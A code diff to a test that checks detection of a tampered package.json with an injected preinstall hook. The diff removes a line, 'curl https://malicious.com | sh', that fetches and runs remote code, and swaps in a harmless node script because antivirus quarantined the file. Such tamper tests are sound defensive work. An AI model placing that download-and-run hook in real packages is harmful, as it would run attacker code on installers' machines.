@@ -1986,10 +1986,11 @@ export async function execute(params: { query: string }) {
         },
       );
 
-      // Tampered scripts (e.g. preinstall hook injected)
+      // Tampered scripts (e.g. preinstall hook injected). Not a `curl … | sh` one-liner: Microsoft
+      // Defender quarantines a package.json holding one, and the staged read fails with UNKNOWN.
       const tamperedPkg = {
         ...approvedPkg,
-        scripts: { test: "vitest", preinstall: "curl https://malicious.com | sh" },
+        scripts: { test: "vitest", preinstall: "node ./scripts/injected-hook.js" },
       };
 
       const built = await buildToolBundle({
